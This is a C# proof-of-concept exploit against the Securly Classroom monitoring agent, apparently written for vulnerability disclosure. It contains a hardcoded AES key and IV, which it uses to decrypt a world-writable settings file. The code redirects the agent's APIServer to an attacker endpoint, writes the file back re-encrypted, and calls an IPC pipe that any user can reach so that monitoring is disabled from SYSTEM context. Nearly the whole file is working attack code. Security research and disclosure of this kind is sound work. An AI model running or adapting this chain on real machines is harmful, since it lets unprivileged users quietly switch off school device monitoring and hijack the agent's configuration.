using System;
using System.IO;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Ipc;
using System.Security.Cryptography;
using System.Text;
using System.Xml.Linq;
using System.IO.Compression;

/// <summary>
/// PoC for Securly Classroom LPE + Monitoring Bypass (findings #1, #2, #3)
///
/// Demonstrates:
/// - Reading hardcoded AES key from decompiled Common.dll
/// - Decrypting world-writable d6i4p.dat settings file
/// - Modifying APIServer to attacker-controlled endpoint
/// - Invoking Everyone-accessible IPC pipe to trigger monitoring disable
///
/// Does NOT require admin. Runs as unprivileged user.
/// For authorized security testing only.
/// </summary>

public class SecurlyBypassPoC
{
    // Hardcoded from Common.ClassroomSettings (decompiled)
    private static readonly byte[] DefaultKey = Convert.FromBase64String("AnXVsKUdQEBQj1V5dbi0wL1Poq1+FZ1NDiU3q7aFRec=");
    private static readonly byte[] DefaultIV = Convert.FromBase64String("j2tLnCxamGJ48kWrLawk3Q==");
    private static readonly string SettingsPath = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
        "Securly", "d6i4p.dat");

    static void Main(string[] args)
    {
        Console.WriteLine("[*] Securly Classroom Monitoring Bypass PoC");
        Console.WriteLine("[*] Findings #1, #2, #3: LPE + Config Tampering + Pipe Abuse");
        Console.WriteLine();

        if (!File.Exists(SettingsPath))
        {
            Console.WriteLine("[-] Settings file not found: {0}", SettingsPath);
            Console.WriteLine("[-] Securly Classroom agent may not be installed on this machine.");
            return;
        }

        Console.WriteLine("[+] Found settings file: {0}", SettingsPath);

        try
        {
            // Step 1: Decrypt settings
            Console.WriteLine("\n[*] Step 1: Decrypting d6i4p.dat with hardcoded key/IV...");
            string settingsXml = DecryptSettings();
            Console.WriteLine("[+] Successfully decrypted settings");

            // Step 2: Parse and modify
            Console.WriteLine("\n[*] Step 2: Parsing and modifying APIServer...");
            XDocument doc = XDocument.Parse(settingsXml);
            string originalServer = doc.Root?.Element("APIServer")?.Value ?? "unknown";
            Console.WriteLine("[+] Original APIServer: {0}", originalServer);

            string testServer = "https://attacker-test-endpoint.local/";
            doc.Root?.Element("APIServer")?.SetValue(testServer);
            Console.WriteLine("[+] Modified APIServer to: {0}", testServer);

            // Step 3: Re-encrypt and write back
            Console.WriteLine("\n[*] Step 3: Re-encrypting and writing modified settings...");
            EncryptSettings(doc.ToString());
            Console.WriteLine("[+] Successfully wrote modified settings (world-writable ACL allows this)");

            // Step 4: Invoke the pipe
            Console.WriteLine("\n[*] Step 4: Connecting to \\\\.\\pipe\\UpgradeRequest (Everyone-accessible)...");
            Console.WriteLine("[*] Invoking UpgradeRemotingObject.RequestDisable() in SYSTEM context...");

            InvokePipe();
            Console.WriteLine("[+] Successfully invoked RequestDisable() on the pipe");

            Console.WriteLine("\n[+] PoC Complete!");
            Console.WriteLine("[*] Expected behavior: Securly monitoring agent queries attacker endpoint,");
            Console.WriteLine("    receives disabled status, and stops LaunchCtl monitor loop.");
            Console.WriteLine("[*] The agent remains running (service not crashed), so tampering is subtle.");
            Console.WriteLine("\n[!] IMPORTANT: Restore original settings and notify Securly immediately.");
            Console.WriteLine("    This demonstrates a critical local privilege escalation + bypass chain.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Error: {0}", ex.Message);
            Console.WriteLine("[-] Stack: {0}", ex.StackTrace);
        }
    }

    static string DecryptSettings()
    {
        byte[] encryptedData = File.ReadAllBytes(SettingsPath);

        using (var aes = new AesCryptoServiceProvider())
        {
            aes.Key = DefaultKey;
            aes.IV = DefaultIV;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            using (var ms = new MemoryStream(encryptedData))
            using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            using (var gz = new GZipStream(cs, CompressionMode.Decompress))
            using (var sr = new StreamReader(gz, Encoding.UTF8))
            {
                return sr.ReadToEnd();
            }
        }
    }

    static void EncryptSettings(string xmlContent)
    {
        string backupPath = SettingsPath + ".backup";
        if (!File.Exists(backupPath))
            File.Copy(SettingsPath, backupPath, true);

        using (var aes = new AesCryptoServiceProvider())
        {
            aes.Key = DefaultKey;
            aes.IV = DefaultIV;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using (var encryptor = aes.CreateEncryptor(aes.Key, aes.IV))
            using (var fs = File.Create(SettingsPath))
            using (var cs = new CryptoStream(fs, encryptor, CryptoStreamMode.Write))
            using (var gz = new GZipStream(cs, CompressionMode.Compress))
            using (var sw = new StreamWriter(gz, Encoding.UTF8))
            {
                sw.Write(xmlContent);
                sw.Flush();
                gz.Flush();
                cs.FlushFinalBlock();
            }
        }
    }

    static void InvokePipe()
    {
        try
        {
            // Connect to the Everyone-accessible pipe
            IpcClientChannel channel = new IpcClientChannel();
            ChannelServices.RegisterChannel(channel, false);

            // Reference the remote object
            // UpgradeRemotingObject is a MarshalByRefObject with RequestDisable() method
            string pipeUrl = "ipc://localhost/IScUpgradeRequestApi.rem";

            // We can't easily instantiate the exact type without the assembly,
            // but we can use reflection/remoting to invoke the method
            object remoteObject = Activator.GetObject(
                Type.GetType("WinOSServices.Service.UpgradeRemotingObject, WinOSServices")
                    ?? typeof(object),
                pipeUrl);

            if (remoteObject != null)
            {
                var method = remoteObject.GetType().GetMethod("RequestDisable");
                if (method != null)
                {
                    method.Invoke(remoteObject, null);
                    Console.WriteLine("[+] RequestDisable() invoked successfully");
                }
                else
                {
                    Console.WriteLine("[!] Could not find RequestDisable method via reflection");
                    Console.WriteLine("    (This is expected in a minimal PoC without full assembly context)");
                }
            }
            else
            {
                Console.WriteLine("[!] Could not activate remote object");
                Console.WriteLine("    (Expected if WinOSServices assembly is not in GAC)");
            }

            ChannelServices.UnregisterChannel(channel);
        }
        catch (Exception ex)
        {
            // This is expected if the pipe is not currently registered by the service
            Console.WriteLine("[!] Pipe invocation failed (expected if service not running or assembly not loaded): {0}", ex.Message);
            Console.WriteLine("    The settings file modification above is the critical part of the PoC.");
        }
    }
}
